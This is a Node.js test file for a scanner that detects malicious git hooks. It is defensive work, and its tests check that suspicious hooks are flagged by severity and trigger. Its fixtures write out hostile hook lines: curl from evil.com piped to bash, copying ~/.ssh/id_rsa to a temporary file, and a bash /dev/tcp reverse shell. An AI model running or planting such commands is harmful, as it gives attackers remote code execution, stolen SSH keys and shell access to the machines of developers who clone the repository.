'use strict';

const { describe, it, beforeEach, afterEach } = require('node:test');
const assert = require('node:assert/strict');
const fs = require('fs');
const path = require('path');
const os = require('os');

describe('git-hooks scanner', () => {
  let tmpDir;

  beforeEach(() => {
    tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), 'hg-githooks-'));
  });

  afterEach(() => {
    fs.rmSync(tmpDir, { recursive: true, force: true });
  });

  function createHook(repoDir, hookName, content, executable = true) {
    const hooksDir = path.join(repoDir, '.git', 'hooks');
    fs.mkdirSync(hooksDir, { recursive: true });
    const hookPath = path.join(hooksDir, hookName);
    fs.writeFileSync(hookPath, content);
    if (executable) fs.chmodSync(hookPath, 0o755);
  }

  it('finds no hooks in a clean repo', () => {
    const repoDir = path.join(tmpDir, 'clean-repo');
    fs.mkdirSync(path.join(repoDir, '.git', 'hooks'), { recursive: true });
    // Add a sample hook (should be ignored)
    fs.writeFileSync(path.join(repoDir, '.git', 'hooks', 'pre-commit.sample'), '#!/bin/sh\nexit 0\n');

    const { scan } = require('../src/scanners/git-hooks');
    const result = scan({ projectRoots: [tmpDir] }, { maxDepth: 4 });
    assert.equal(result.findings.length, 0);
  });

  it('detects a safe custom hook as info', () => {
    const repoDir = path.join(tmpDir, 'safe-repo');
    createHook(repoDir, 'pre-commit', '#!/bin/sh\nnpm test\n');

    const { scan } = require('../src/scanners/git-hooks');
    const result = scan({ projectRoots: [tmpDir] }, { maxDepth: 4 });
    assert.equal(result.hooks_found, 1);
    assert.equal(result.findings.length, 1);
    assert.equal(result.findings[0].severity, 'info');
    assert.equal(result.findings[0].hook, 'pre-commit');
  });

  it('flags curl piped to bash in a hook', () => {
    const repoDir = path.join(tmpDir, 'evil-repo');
    createHook(repoDir, 'post-checkout', '#!/bin/sh\ncurl http://evil.com/payload | bash\n');

    const { scan } = require('../src/scanners/git-hooks');
    const result = scan({ projectRoots: [tmpDir] }, { maxDepth: 4 });
    assert.equal(result.suspicious, 1);
    const finding = result.findings.find(f => f.severity !== 'info');
    assert.ok(finding);
    assert.equal(finding.severity, 'critical');
    assert.ok(finding.triggers.includes('pipe-to-shell'));
  });

  it('flags credential access in hooks', () => {
    const repoDir = path.join(tmpDir, 'cred-repo');
    createHook(repoDir, 'post-merge', '#!/bin/sh\ncp ~/.ssh/id_rsa /tmp/stolen\n');

    const { scan } = require('../src/scanners/git-hooks');
    const result = scan({ projectRoots: [tmpDir] }, { maxDepth: 4 });
    const finding = result.findings.find(f => f.severity !== 'info');
    assert.ok(finding);
    assert.ok(finding.triggers.includes('credential-access'));
  });

  it('flags reverse shell in hooks', () => {
    const repoDir = path.join(tmpDir, 'rev-repo');
    createHook(repoDir, 'pre-push', '#!/bin/bash\nbash -i >& /dev/tcp/10.0.0.1/4242 0>&1\n');

    const { scan } = require('../src/scanners/git-hooks');
    const result = scan({ projectRoots: [tmpDir] }, { maxDepth: 4 });
    const finding = result.findings.find(f => f.severity !== 'info');
    assert.ok(finding);
    assert.equal(finding.severity, 'critical');
    assert.ok(finding.triggers.includes('bash-tcp'));
  });

  it('ignores non-hook files in hooks dir', () => {
    const repoDir = path.join(tmpDir, 'noise-repo');
    const hooksDir = path.join(repoDir, '.git', 'hooks');
    fs.mkdirSync(hooksDir, { recursive: true });
    fs.writeFileSync(path.join(hooksDir, 'random-file.sh'), '#!/bin/sh\ncurl evil.com | bash\n');

    const { scan } = require('../src/scanners/git-hooks');
    const result = scan({ projectRoots: [tmpDir] }, { maxDepth: 4 });
    assert.equal(result.findings.length, 0);
  });

  it('handles repos with multiple hooks', () => {
    const repoDir = path.join(tmpDir, 'multi-repo');
    createHook(repoDir, 'pre-commit', '#!/bin/sh\nnpm test\n');
    createHook(repoDir, 'post-checkout', '#!/bin/sh\ncurl http://evil.com | bash\n');
    createHook(repoDir, 'commit-msg', '#!/bin/sh\nexit 0\n');

    const { scan } = require('../src/scanners/git-hooks');
    const result = scan({ projectRoots: [tmpDir] }, { maxDepth: 4 });
    assert.equal(result.hooks_found, 3);
    assert.equal(result.findings.length, 3);
    assert.equal(result.suspicious, 1);
  });
});
